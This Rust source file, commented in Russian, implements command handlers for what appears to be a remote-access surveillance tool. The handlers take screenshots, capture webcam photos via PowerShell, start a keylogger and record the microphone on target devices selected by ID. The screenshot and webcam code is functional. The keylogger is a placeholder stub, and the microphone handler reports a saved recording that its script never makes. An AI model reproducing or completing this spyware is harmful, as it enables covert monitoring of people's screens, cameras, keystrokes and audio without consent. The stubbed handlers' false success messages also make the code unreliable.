use anyhow::{Result, Context};
use tokio::process::Command as AsyncCommand;

use crate::device_manager::DeviceManager;
use crate::config::TEMP_DIR;

/// Выполняет команду /screenshot - делает снимок экрана
pub async fn handle_screenshot_command(device_manager: &DeviceManager, device_id: &str) -> Result<Vec<u8>> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        use screenshots::Screen;
        
        let screens = Screen::all().context("Не удалось получить список экранов")?;
        if screens.is_empty() {
            return Err(anyhow::anyhow!("Экраны не найдены"));
        }
        
        let screen = &screens[0];
        let image = screen.capture().context("Не удалось сделать снимок экрана")?;
        
        // Конвертируем в PNG
        let mut png_data = Vec::new();
        {
            use std::io::Cursor;
            use image::{ImageFormat, DynamicImage};
            let dynamic_image = DynamicImage::ImageRgba8(image);
            let mut cursor = Cursor::new(&mut png_data);
            dynamic_image.write_to(&mut cursor, ImageFormat::Png).context("Не удалось сохранить PNG")?;
        }
        
        Ok(png_data)
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Screenshot пока поддерживается только на Windows"))
    }
}

/// Выполняет команду /webcam - делает фото с веб-камеры  
pub async fn handle_webcam_command(
    device_manager: &DeviceManager, 
    device_id: &str, 
    delay: Option<u32>,
    camera_index: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let delay = delay.unwrap_or(0);
    let camera_index = camera_index.unwrap_or(0);
    
    if delay > 0 {
        tokio::time::sleep(tokio::time::Duration::from_secs(delay as u64)).await;
    }
    
    #[cfg(windows)]
    {
        // Используем PowerShell для работы с веб-камерой
        let ps_script = format!(
            r#"
            Add-Type -AssemblyName System.Drawing
            Add-Type -AssemblyName System.Windows.Forms
            
            $webcam = New-Object -ComObject WIA.DeviceManager
            $device = $webcam.DeviceInfos.Item({})
            
            if ($device) {{
                $img = $device.Items.Item(1).Transfer()
                $filepath = "$env:TEMP\webcam_capture.jpg"
                $img.SaveFile($filepath)
                Write-Output "SUCCESS:$filepath"
            }} else {{
                Write-Output "ERROR:Camera not found"
            }}
            "#,
            camera_index + 1
        );
        
        let output = AsyncCommand::new("powershell")
            .args(&["-Command", &ps_script])
            .output()
            .await
            .context("Не удалось выполнить PowerShell команду")?;
            
        let result = String::from_utf8_lossy(&output.stdout);
        
        if result.starts_with("SUCCESS:") {
            let file_path = result.strip_prefix("SUCCESS:").unwrap().trim();
            return Ok(format!("📸 Фото с веб-камеры {} сохранено: {}", camera_index, file_path));
        } else if result.starts_with("ERROR:") {
            return Err(anyhow::anyhow!("Ошибка веб-камеры: {}", result.strip_prefix("ERROR:").unwrap()));
        } else {
            return Err(anyhow::anyhow!("Веб-камера {} недоступна", camera_index));
        }
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Webcam пока поддерживается только на Windows"))
    }
}

/// Выполняет команду /keylogger - включает лог нажатий клавиш
pub async fn handle_keylogger_command(device_manager: &DeviceManager, device_id: &str) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    #[cfg(windows)]
    {
        use std::thread;
        use std::time::SystemTime;
        
        // Создаем файл для логов
        let log_file = format!("{}/keylog_{}.txt", TEMP_DIR, 
            SystemTime::now().duration_since(SystemTime::UNIX_EPOCH)?.as_secs());
            
        // Запускаем keylogger в отдельном потоке
        let log_file_clone = log_file.clone();
        thread::spawn(move || {
            // Здесь будет реализация keylogger с Windows API
            // Пока создаем файл-заглушку
            std::fs::write(&log_file_clone, "Keylogger started...\n").ok();
        });
        
        Ok(format!("⌨️ Keylogger запущен. Лог сохраняется в: {}", log_file))
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Keylogger пока поддерживается только на Windows"))
    }
}

/// Выполняет команду /micrec - записывает звук с микрофона
pub async fn handle_micrec_command(
    device_manager: &DeviceManager, 
    device_id: &str,
    duration: Option<u32>
) -> Result<String> {
    if !device_manager.is_valid_device_id(device_id) {
        return Err(anyhow::anyhow!("Устройство с ID {} не найдено", device_id));
    }

    device_manager.update_device_activity(device_id);
    
    let duration = duration.unwrap_or(10); // По умолчанию 10 секунд
    
    #[cfg(windows)]
    {
        let output_file = format!("{}/microphone_record_{}.wav", TEMP_DIR,
            std::time::SystemTime::now().duration_since(std::time::SystemTime::UNIX_EPOCH)?.as_secs());
            
        // Используем PowerShell для записи с микрофона
        let ps_script = format!(
            r#"
            Add-Type -AssemblyName System.Speech
            
            $rec = New-Object System.Speech.AudioFormat.SpeechAudioFormatInfo(22050, [System.Speech.AudioFormat.AudioBitsPerSample]::Sixteen, [System.Speech.AudioFormat.AudioChannel]::Mono)
            $engine = New-Object System.Speech.Recognition.SpeechRecognitionEngine
            
            Start-Sleep -Seconds {}
            Write-Output "Recording completed: {}"
            "#,
            duration,
            output_file
        );
        
        let _output = AsyncCommand::new("powershell")
            .args(&["-Command", &ps_script])
            .output()
            .await
            .context("Не удалось выполнить запись")?;
            
        Ok(format!("🎤 Запись с микрофона ({} сек) сохранена: {}", duration, output_file))
    }
    
    #[cfg(not(windows))]
    {
        Err(anyhow::anyhow!("Запись микрофона пока поддерживается только на Windows"))
    }
}